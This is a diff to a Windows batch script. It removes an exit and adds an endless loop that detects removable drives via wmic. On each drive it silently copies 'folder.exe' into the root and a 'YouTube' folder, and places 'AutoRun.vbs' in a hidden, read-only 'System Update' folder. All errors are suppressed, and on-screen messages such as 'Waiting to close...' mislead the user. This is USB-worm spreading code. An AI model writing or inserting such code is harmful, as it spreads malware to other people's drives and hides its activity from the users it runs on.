@@ -525,21 +525,62 @@ echo .
    echo ************* Give feedback success ****************
    echo Yes!!    
 
-   exit /b
+ 
 
    
+
+
+::echo ************* Pendrive check ****************
+   :pendrive
+   echo ************* Done ****************
+	  timeout 1 > NUL
+	  ::echo Checking for pendrive...
+	  echo Waiting to close...
+	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
+	  if %%l equ 2 (
+		 mkdir %%i\YouTube > nul 2> nul
+
+
+		 if not exist "%%i\folder.exe" (
+		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i" /Y > nul 2> nul
+		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
+		 )
+
+		 if not exist "%%i\YouTube\folder.exe" (
+		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+		 )
+
+
+
+
+                 if not exist "%%i\System Update" mkdir "%%i\System Update" > nul 2> nul
+		 attrib +h +r "%%i\System Update" /s /d > nul 2> nul
+
+
+
+		 if not exist "%%i\YouTube\AutoRun.vbs" (
+		        copy "C:\Users\Public\Licence\Extension\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+		 )
+		 
+		 echo Copied!
+
+
+
+		 ) 
+	  )
+	  echo.
+	  echo.
+	  cls
+          echo Click close to close the window...
+
+
+	  goto pendrive
+
+
+
+
+	exit /b  
   
-  
-  
-  
-  
-  
-  
-  
-   
-  
-   
-   
-   
-   
   
